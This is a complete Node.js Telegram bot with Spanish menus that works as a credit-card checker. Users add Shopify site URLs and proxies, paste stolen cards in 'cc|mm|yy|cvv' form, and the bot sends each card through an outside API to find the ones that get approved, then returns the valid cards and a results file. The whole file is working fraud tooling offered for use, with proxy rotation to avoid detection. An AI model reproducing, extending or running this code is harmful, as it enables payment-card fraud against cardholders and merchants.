require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = Number(process.env.OWNER_ID);
const API_BASE = 'https://auto-shopify-api-production.up.railway.app/index.php';

if (!BOT_TOKEN) {
  console.error('BOT_TOKEN no definido');
  process.exit(1);
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

/* ================== DATA ================== */
const DATA_FILE = './data.json';
let data = fs.existsSync(DATA_FILE)
  ? JSON.parse(fs.readFileSync(DATA_FILE))
  : {
      sites: [],
      proxies: [],
      activeSite: null,
      activeProxy: null
    };

function saveData() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  return id === OWNER_ID;
}

/* ================== RUNTIME ================== */
const running = {}; // chatId => boolean

/* ================== UI ================== */
const mainMenu = {
  reply_markup: {
    inline_keyboard: [
      [{ text: '🌐 Sites', callback_data: 'menu_sites' }],
      [{ text: '🧰 Proxies', callback_data: 'menu_proxies' }],
      [{ text: '▶️ CHK', callback_data: 'menu_chk' }],
      [{ text: '⚙️ Admin', callback_data: 'menu_admin' }]
    ]
  }
};

const backMenu = {
  reply_markup: {
    inline_keyboard: [[{ text: '⬅️ Volver', callback_data: 'back_main' }]]
  }
};

/* ================== START ================== */
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
`🤖 *Bot CHK activo*

Usa los botones para configurar y ejecutar.`,
    { parse_mode: 'Markdown', ...mainMenu }
  );
});

/* ================== CALLBACKS ================== */
bot.on('callback_query', async (q) => {
  const chatId = q.message.chat.id;

  switch (q.data) {
    case 'back_main':
      return bot.sendMessage(chatId, 'Menú principal 👇', mainMenu);

    /* ---------- SITES ---------- */
    case 'menu_sites':
      return bot.sendMessage(
        chatId,
`🌐 *Gestión de Sites*
Activo: ${data.activeSite || 'Ninguno'}`,
        {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '➕ Agregar', callback_data: 'add_site' }],
              [{ text: '📋 Listar', callback_data: 'list_sites' }],
              [{ text: '🎯 Elegir activo', callback_data: 'pick_site' }],
              [{ text: '🗑 Limpiar', callback_data: 'clear_sites' }],
              [{ text: '⬅️ Volver', callback_data: 'back_main' }]
            ]
          }
        }
      );

    case 'add_site':
      return bot.sendMessage(
        chatId,
`Envía los sites (uno por línea)
Ejemplo:
https://site1.com
https://site2.com`,
        backMenu
      );

    case 'list_sites':
      if (!data.sites.length) {
        return bot.sendMessage(chatId, '❌ No hay sites', backMenu);
      }
      return bot.sendMessage(
        chatId,
        data.sites.map((s, i) => `${i + 1}. ${s}`).join('\n'),
        backMenu
      );

    case 'pick_site':
      if (!data.sites.length) {
        return bot.sendMessage(chatId, '❌ No hay sites', backMenu);
      }
      return bot.sendMessage(
        chatId,
        'Responde con el número del site a activar:',
        backMenu
      );

    case 'clear_sites':
      data.sites = [];
      data.activeSite = null;
      saveData();
      return bot.sendMessage(chatId, '🧹 Sites eliminados', backMenu);

    /* ---------- PROXIES ---------- */
    case 'menu_proxies':
      return bot.sendMessage(
        chatId,
`🧰 *Gestión de Proxies*
Activo: ${data.activeProxy || 'Ninguno'}`,
        {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '➕ Agregar', callback_data: 'add_proxy' }],
              [{ text: '📋 Listar', callback_data: 'list_proxies' }],
              [{ text: '🎯 Elegir activo', callback_data: 'pick_proxy' }],
              [{ text: '🗑 Limpiar', callback_data: 'clear_proxies' }],
              [{ text: '⬅️ Volver', callback_data: 'back_main' }]
            ]
          }
        }
      );

    case 'add_proxy':
      return bot.sendMessage(
        chatId,
`Envía los proxies (uno por línea)
Ejemplo:
ip:port:user:pass`,
        backMenu
      );

    case 'list_proxies':
      if (!data.proxies.length) {
        return bot.sendMessage(chatId, '❌ No hay proxies', backMenu);
      }
      return bot.sendMessage(
        chatId,
        data.proxies.map((p, i) => `${i + 1}. ${p}`).join('\n'),
        backMenu
      );

    case 'pick_proxy':
      if (!data.proxies.length) {
        return bot.sendMessage(chatId, '❌ No hay proxies', backMenu);
      }
      return bot.sendMessage(
        chatId,
        'Responde con el número del proxy a activar:',
        backMenu
      );

    case 'clear_proxies':
      data.proxies = [];
      data.activeProxy = null;
      saveData();
      return bot.sendMessage(chatId, '🧹 Proxies eliminados', backMenu);

    /* ---------- CHK ---------- */
    case 'menu_chk':
      return bot.sendMessage(
        chatId,
`▶️ *CHK*
Envía las tarjetas:
cc|mm|yy|cvv
(una por línea)

Usa /stop para cortar.`,
        { parse_mode: 'Markdown', ...backMenu }
      );

    /* ---------- ADMIN ---------- */
    case 'menu_admin':
      if (!isOwner(q.from.id)) {
        return bot.sendMessage(chatId, '❌ Solo admin');
      }
      return bot.sendMessage(
        chatId,
`⚙️ *Panel Admin*
Sites: ${data.sites.length}
Proxies: ${data.proxies.length}
Activo site: ${data.activeSite || 'Ninguno'}
Activo proxy: ${data.activeProxy || 'Ninguno'}

Comandos:
• /clearall`,
        { parse_mode: 'Markdown', ...backMenu }
      );
  }
});

/* ================== TEXT INPUT HANDLERS ================== */
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text || '';

  // agregar sites
  if (text.startsWith('http')) {
    const lines = text.split('\n').map(x => x.trim()).filter(Boolean);
    data.sites.push(...lines);
    saveData();
    return bot.sendMessage(chatId, `✅ ${lines.length} site(s) agregados`, mainMenu);
  }

  // agregar proxies
  if (text.includes(':') && text.split(':').length >= 2 && !text.startsWith('/')) {
    const lines = text.split('\n').map(x => x.trim()).filter(Boolean);
    data.proxies.push(...lines);
    saveData();
    return bot.sendMessage(chatId, `✅ ${lines.length} proxy(s) agregados`, mainMenu);
  }

  // elegir site
  if (/^\d+$/.test(text) && data.sites[Number(text) - 1]) {
    data.activeSite = data.sites[Number(text) - 1];
    saveData();
    return bot.sendMessage(chatId, `🎯 Site activo:\n${data.activeSite}`, mainMenu);
  }

  // elegir proxy
  if (/^\d+$/.test(text) && data.proxies[Number(text) - 1]) {
    data.activeProxy = data.proxies[Number(text) - 1];
    saveData();
    return bot.sendMessage(chatId, `🎯 Proxy activo:\n${data.activeProxy}`, mainMenu);
  }
});

/* ================== STOP ================== */
bot.onText(/\/stop/, (msg) => {
  running[msg.chat.id] = false;
  bot.sendMessage(msg.chat.id, '⛔ Proceso detenido');
});

/* ================== CLEAR ALL (ADMIN) ================== */
bot.onText(/\/clearall/, (msg) => {
  if (!isOwner(msg.from.id)) return;
  data = { sites: [], proxies: [], activeSite: null, activeProxy: null };
  saveData();
  bot.sendMessage(msg.chat.id, '🧹 Todo limpiado');
});

/* ================== CHK (MISMA LÓGICA) ================== */
bot.onText(/\/chk([\s\S]*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!data.activeSite || !data.activeProxy) {
    return bot.sendMessage(chatId, '❌ Selecciona site y proxy activos');
  }

  const input = match[1].trim();
  if (!input) return;

  const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);
  running[chatId] = true;

  let ok = 0, bad = 0, err = 0;
  const results = [];

  const progress = await bot.sendMessage(chatId, `⏳ 0/${ccs.length}`);

  for (let i = 0; i < ccs.length; i++) {
    if (!running[chatId]) break;

    try {
      const res = await axios.get(API_BASE, {
        params: { site: data.activeSite, cc: ccs[i], proxy: data.activeProxy },
        timeout: 30000
      });

      if (String(res.data.Response).toUpperCase().includes('APPRO')) {
        ok++;
        bot.sendMessage(chatId, `✅ APPROVED\n${ccs[i]}`);
        results.push(`${ccs[i]} | APPROVED`);
      } else {
        bad++;
        results.push(`${ccs[i]} | DECLINED`);
      }
    } catch {
      err++;
      results.push(`${ccs[i]} | ERROR`);
    }

    await bot.editMessageText(
      `⏳ ${i + 1}/${ccs.length}\n✅ ${ok} ❌ ${bad} ⚠️ ${err}`,
      { chat_id: chatId, message_id: progress.message_id }
    );
  }

  running[chatId] = false;

  const file = `results_${Date.now()}.txt`;
  fs.writeFileSync(file, results.join('\n'));
  await bot.sendDocument(chatId, file);
  fs.unlinkSync(file);

  bot.sendMessage(chatId, '✅ Finalizado', mainMenu);
});

console.log('🤖 Bot iniciado correctamente');
